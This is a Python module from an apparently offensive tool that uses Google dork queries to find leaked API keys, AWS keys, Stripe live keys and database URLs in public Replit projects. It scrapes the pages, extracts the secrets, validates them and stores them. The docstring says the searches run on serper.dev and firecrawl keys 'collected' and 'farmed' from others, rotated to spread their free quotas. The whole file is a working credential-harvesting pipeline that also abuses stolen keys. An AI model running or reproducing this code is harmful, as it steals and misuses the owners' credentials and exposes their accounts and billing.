"""
Replit scanner — Level 2: hunt leaked credentials across PUBLIC Repls
via Google dorking (using our own collected serper.dev keys).

Architecture rationale (per user discussion 2026-05-06):
  - Replit's internal search is poor; Google indexes Replit pages much better.
  - We don't need Replit account/tokens — public Repls are open to anonymous web access.
  - We use OUR collected serper keys (~7 valid, 124 found total, 78% conv) for the
    Google search API. Cost = $0 per query (we farmed them).
  - Optional firecrawl fallback (~71 valid keys collected) for full-page extraction
    when serper's snippets aren't enough.

Pipeline:
  1. Build "site:replit.com <dork>" queries targeting common leak patterns
     (env-var literals, kv.replit.com URLs, .env / secrets / config files).
  2. For each query, hit serper.dev /search (with rotating valid keys).
  3. Each result has {title, link, snippet}. Extract aggressively from snippet
     first — it often contains the literal leaked secret.
  4. If snippet has triggers but no extractable key, fetch the page content
     via firecrawl (rotating valid keys) for a deeper look.
  5. Run all our existing extractors (AI + infra) on the gathered content.
  6. Save finds with file_type='replit' so the breakdown attributes them.

Designed to fail noisily: every error logged at WARNING with concrete cause
so the user can iterate quickly when Replit/serper/firecrawl change something.
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import random
from datetime import datetime, timezone

import httpx

import db
from patterns import EXTRACTORS, AI_TRIGGER, INFRA_TRIGGER
from infra_patterns import INFRA_EXTRACTORS, extract_destination, assess_risk
from deobfuscate import expand as _deobf_expand
from validators import validate
from notifier import notify_found, notify_infra_found

log = logging.getLogger(__name__)

REPLIT_SCAN_INTERVAL = int(os.environ.get("REPLIT_SCAN_INTERVAL", "900"))   # 15min
                                                                             # 36 dorks × ~1 call = 36-50 serper
                                                                             # calls/cycle. With 150 keys × 2500/mo
                                                                             # free tier = 375K query budget,
                                                                             # 36×96=3456/day = 0.9% budget — plenty
                                                                             # of headroom for fast iteration.
REPLIT_RESULTS_PER_QUERY = int(os.environ.get("REPLIT_RESULTS_PER_QUERY", "100"))

_SERPER_BASE = "https://google.serper.dev/search"
_FIRECRAWL_BASE = "https://api.firecrawl.dev/v1/scrape"

_LIMITS = httpx.Limits(max_connections=15, max_keepalive_connections=5, keepalive_expiry=20)


# ── Google dork queries (all gated on site:replit.com) ─────────────────────
# Critical: `filename:` is GitHub syntax, NOT Google. Use `inurl:` for path
# matching. Quoted strings with `=` can also break serper parser — use
# space-separated tokens instead.
_DORKS = [
    # Replit-specific cred shapes
    'site:replit.com "REPLIT_DB_URL"',
    'site:replit.com "kv.replit.com/v0"',
    'site:replit.com "REPLIT_API_TOKEN"',
    # Major AI providers — quote ONLY the prefix, not the assignment
    'site:replit.com "OPENAI_API_KEY" "sk-"',
    'site:replit.com "ANTHROPIC_API_KEY" "sk-ant-"',
    'site:replit.com "GEMINI_API_KEY" "AIzaSy"',
    'site:replit.com "GOOGLE_API_KEY" "AIzaSy"',
    'site:replit.com "DEEPSEEK_API_KEY" "sk-"',
    'site:replit.com "GROQ_API_KEY" "gsk_"',
    'site:replit.com "REPLICATE_API_TOKEN" "r8_"',
    'site:replit.com "HF_TOKEN" "hf_"',
    'site:replit.com "HUGGINGFACE_TOKEN" "hf_"',
    'site:replit.com "XAI_API_KEY" "xai-"',
    'site:replit.com "MISTRAL_API_KEY"',
    'site:replit.com "ELEVENLABS_API_KEY"',
    'site:replit.com "OPENROUTER_API_KEY" "sk-or-v1-"',
    'site:replit.com "STABILITY_API_KEY" "sk-"',
    # CN providers
    'site:replit.com "ZHIPUAI_API_KEY"',
    'site:replit.com "MOONSHOT_API_KEY" "sk-"',
    'site:replit.com "ARK_API_KEY"',
    'site:replit.com "DASHSCOPE_API_KEY"',
    'site:replit.com "QWEN_API_KEY"',
    'site:replit.com "SILICONFLOW_API_KEY"',
    # Infra
    'site:replit.com "AKIA"',                   # AWS access key prefix
    'site:replit.com "DATABASE_URL" "postgres"',
    'site:replit.com "MONGODB_URI" "mongodb"',
    'site:replit.com "REDIS_URL" "redis"',
    'site:replit.com inurl:.env',
    'site:replit.com inurl:secrets.toml',
    'site:replit.com inurl:.replit',
    # Bot tokens & integration
    'site:replit.com "DISCORD_TOKEN"',
    'site:replit.com "TELEGRAM_BOT_TOKEN"',
    'site:replit.com "STRIPE_SECRET_KEY" "sk_live_"',
    'site:replit.com "TWILIO_AUTH_TOKEN"',
    'site:replit.com "SUPABASE_KEY"',
    'site:replit.com "PINECONE_API_KEY"',
]


# ── Key pool helpers ────────────────────────────────────────────────────────

def _serper_keys() -> list[str]:
    """Get valid serper keys from our DB. Rotated random order each call."""
    rows = db.get_valid_keys_by_provider("serper")
    keys = [r["key_full"] for r in rows]
    random.shuffle(keys)
    return keys


def _firecrawl_keys() -> list[str]:
    rows = db.get_valid_keys_by_provider("firecrawl")
    keys = [r["key_full"] for r in rows]
    random.shuffle(keys)
    return keys


def _mark_dead(provider: str, key: str):
    """Mark a serper/firecrawl key as is_valid=0 — the standard
    revalidation loop will pick it up later for re-check."""
    h = hashlib.sha256(key.encode()).hexdigest()
    try:
        db.update_key_validity(h, False)
        log.warning("[replit] marked %s key dead: %s", provider, key[:14])
    except Exception as e:
        log.debug("[replit] mark_dead err: %s", e)


# ── Serper search with key rotation ─────────────────────────────────────────

async def _serper_search(client: httpx.AsyncClient, query: str,
                         keys: list[str]) -> list[dict]:
    """Returns list of organic search results: [{title,link,snippet}, ...].
    Rotates through keys on 401/402/403/429. Logs concrete errors so we
    can spot pattern changes quickly."""
    last_err = ""
    for key in keys:
        try:
            r = await client.post(
                _SERPER_BASE,
                headers={
                    "X-API-KEY": key,
                    "Content-Type": "application/json",
                },
                json={"q": query, "num": min(REPLIT_RESULTS_PER_QUERY, 100)},
                timeout=20,
            )
            if r.status_code in (401, 402, 403):
                _mark_dead("serper", key)
                last_err = f"serper {r.status_code} on key {key[:8]}"
                continue
            if r.status_code == 429:
                last_err = f"serper 429 on key {key[:8]}"
                # 429 is per-key — try next
                continue
            if r.status_code == 400:
                # Bad request = malformed query, NOT auth issue. Trying other
                # keys won't help. Log + abort for this query (don't waste 150
                # keys' rate budget on a single broken dork).
                log.warning("[replit] serper 400 BAD QUERY %r — body: %s",
                            query[:80], r.text[:160])
                return []
            if r.status_code != 200:
                last_err = f"serper status={r.status_code} body={r.text[:160]}"
                continue
            data = r.json()
            organic = data.get("organic", [])
            if isinstance(organic, list):
                return organic
            return []
        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:120]}"
            continue
    log.warning("[replit] serper search failed for %r: %s", query[:60], last_err)
    return []


# ── Firecrawl fetch (fallback for full content) ─────────────────────────────

async def _firecrawl_fetch(client: httpx.AsyncClient, url: str,
                           keys: list[str]) -> str | None:
    """Fetch URL content as markdown via firecrawl. Returns None on failure
    (caller should not crash on missing content — many Replit pages also
    accessible via direct HTTP fetch as a separate fallback)."""
    last_err = ""
    for key in keys[:3]:  # cap retries to 3 keys
        try:
            r = await client.post(
                _FIRECRAWL_BASE,
                headers={
                    "Authorization": f"Bearer {key}",
                    "Content-Type": "application/json",
                },
                json={"url": url, "formats": ["markdown"]},
                timeout=30,
            )
            if r.status_code in (401, 402, 403):
                _mark_dead("firecrawl", key)
                last_err = f"firecrawl {r.status_code}"
                continue
            if r.status_code != 200:
                last_err = f"firecrawl status={r.status_code}"
                continue
            data = r.json()
            md = (data.get("data") or {}).get("markdown") or ""
            if md:
                return md
            return None
        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:100]}"
    log.debug("[replit] firecrawl fetch failed for %s: %s", url[:80], last_err)
    return None


# ── Direct HTTP fetch (cheaper than firecrawl when page is plain HTML) ─────

async def _direct_fetch(client: httpx.AsyncClient, url: str) -> str | None:
    """Try direct HTTP GET on the Replit page. Many simple Repls expose
    code via the `replit.com/@user/repl` HTML or `<repl>--<user>.replit.dev`
    preview URL. Free, no API key needed."""
    try:
        r = await client.get(url, timeout=15, follow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 ghscan-replit/1.0"})
        if r.status_code == 200:
            return r.text
    except Exception as e:
        log.debug("[replit] direct fetch %s failed: %s", url[:60], e)
    return None


# ── Content scanning (mirrors scanner._scan_blob pattern) ───────────────────

async def _scan_text(text: str, url: str, query: str) -> tuple[int, int]:
    """Run all extractors on `text`. Returns (ai_keys_saved, valid_ai_saved).
    Infra creds tracked separately in infra_findings (not counted here)."""
    if not text:
        return 0, 0
    text = _deobf_expand(text)
    has_ai    = any(t in text for t in AI_TRIGGER)
    has_infra = any(t in text for t in INFRA_TRIGGER)
    if not has_ai and not has_infra:
        return 0, 0

    # Use repl ID extracted from URL as repo label
    repo_label = url.replace("https://replit.com/", "").replace("https://", "")[:200]

    keys_saved = valid_saved = 0
    if has_ai:
        for prov, fn in EXTRACTORS.items():
            for key in fn(text):
                if db.key_exists(key):
                    continue
                try:
                    is_valid = await validate(prov, key)
                except Exception as e:
                    log.debug("[replit] validate %s err: %s", prov, e)
                    is_valid = False
                saved = db.save_key(
                    prov, key, repo_label, "replit-page", url,
                    0, "", "replit", is_valid,
                )
                if saved:
                    keys_saved += 1
                    if is_valid:
                        valid_saved += 1
                    try:
                        await notify_found(
                            prov, key, repo_label, "replit-page", url,
                            0, "", "replit", is_valid,
                        )
                    except Exception:
                        pass
                    log.info("[replit %s] %s from %s",
                             "VALID" if is_valid else "found", prov, url[:80])

    if has_infra:
        risk_cache = None
        for iprov, ifn in INFRA_EXTRACTORS.items():
            try:
                creds = ifn(text)
            except Exception as e:
                log.debug("[replit] infra extract %s err: %s", iprov, e)
                continue
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(text, "replit-page", 0, "")
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                saved = db.save_infra(
                    iprov, cred, repo_label, "replit-page", url,
                    0, "", "replit", destination, risk_level, risk_reasons,
                )
                if saved:
                    try:
                        await notify_infra_found(
                            iprov, cred, repo_label, "replit-page", url,
                            0, "", "replit", destination, risk_level, risk_reasons,
                        )
                    except Exception:
                        pass
                    log.info("[replit infra/%s] %s from %s",
                             iprov, destination[:60] or cred[:30], url[:80])

    return keys_saved, valid_saved


# ── Per-query worker ────────────────────────────────────────────────────────

async def _process_dork(client: httpx.AsyncClient, query: str,
                        serper_keys: list[str], fc_keys: list[str]) -> dict:
    """Dork → results → snippet scan + (optional) full content scan.
    Returns counters for log/aggregate."""
    results = await _serper_search(client, query, serper_keys)
    if not results:
        return {"results": 0, "ai_saved": 0, "valid_saved": 0, "fetched": 0}

    ai_saved = valid_saved = fetched = 0
    for r in results:
        url = r.get("link", "")
        if not url or "replit.com" not in url:
            continue
        snippet = (r.get("snippet") or "") + " " + (r.get("title") or "")

        # Phase 1: scan the snippet directly. Often contains the secret literal.
        ks, vs = await _scan_text(snippet, url, query)
        ai_saved += ks
        valid_saved += vs

        # Phase 2: full-page fetch — Replit is a JavaScript SPA so direct HTTP
        # returns mostly empty skeleton without code. Firecrawl renders JS and
        # returns proper markdown. Use firecrawl FIRST (we have 77 valid keys
        # in pool, plenty), fall back to direct HTTP only if firecrawl pool
        # exhausted or fails.
        # Always fetch when URL points to a Repl page — snippets often lack
        # the actual code body that contains keys.
        full = None
        is_repl_page = ("/@" in url or "replit.com/repl" in url
                        or url.endswith(".replit.dev")
                        or "replit.dev/" in url)
        if is_repl_page:
            if fc_keys:
                full = await _firecrawl_fetch(client, url, fc_keys)
            if not full:
                full = await _direct_fetch(client, url)
            if full:
                fetched += 1
                ks2, vs2 = await _scan_text(full, url, query)
                ai_saved += ks2
                valid_saved += vs2

    return {"results": len(results), "ai_saved": ai_saved,
            "valid_saved": valid_saved, "fetched": fetched}


# ── Cycle ────────────────────────────────────────────────────────────────────

async def run_replit_cycle():
    serper_keys = _serper_keys()
    if not serper_keys:
        log.warning("[replit] no valid serper keys in DB — skipping cycle")
        return
    fc_keys = _firecrawl_keys()  # may be empty, that's fine

    log.info("=== replit cycle start | %d serper keys | %d firecrawl keys "
             "| %d dorks ===", len(serper_keys), len(fc_keys), len(_DORKS))

    cycle_results = 0
    cycle_ai_saved = 0
    cycle_valid_saved = 0
    cycle_fetched = 0

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS) as client:
        for i, dork in enumerate(_DORKS):
            try:
                stats = await _process_dork(client, dork, serper_keys, fc_keys)
                cycle_results += stats["results"]
                cycle_ai_saved += stats["ai_saved"]
                cycle_valid_saved += stats["valid_saved"]
                cycle_fetched += stats["fetched"]
                if stats["valid_saved"] > 0:
                    log.info("[replit dork] %r → %d results, %d valid AI keys",
                             dork[:60], stats["results"], stats["valid_saved"])
            except Exception as e:
                log.warning("[replit dork failed] %r: %s", dork[:60], e)
            await asyncio.sleep(2.0)

    log.info("=== replit cycle done | %d total results | %d ai_keys saved "
             "(%d valid) | %d full-page fetches ===",
             cycle_results, cycle_ai_saved, cycle_valid_saved, cycle_fetched)


async def replit_loop():
    if not db.get_valid_keys_by_provider("serper"):
        log.info("[replit] no serper keys yet — waiting for harvest first")
        await asyncio.sleep(3600)  # check again in 1h

    log.info("replit scanner started | interval=%ds | %d dorks",
             REPLIT_SCAN_INTERVAL, len(_DORKS))
    # Boot delay so first cycle doesn't race the deploy startup
    await asyncio.sleep(60)
    while True:
        try:
            await run_replit_cycle()
        except Exception as e:
            log.error("replit cycle crashed: %s", e)
        log.info("replit sleeping %ds until next cycle", REPLIT_SCAN_INTERVAL)
        await asyncio.sleep(REPLIT_SCAN_INTERVAL)
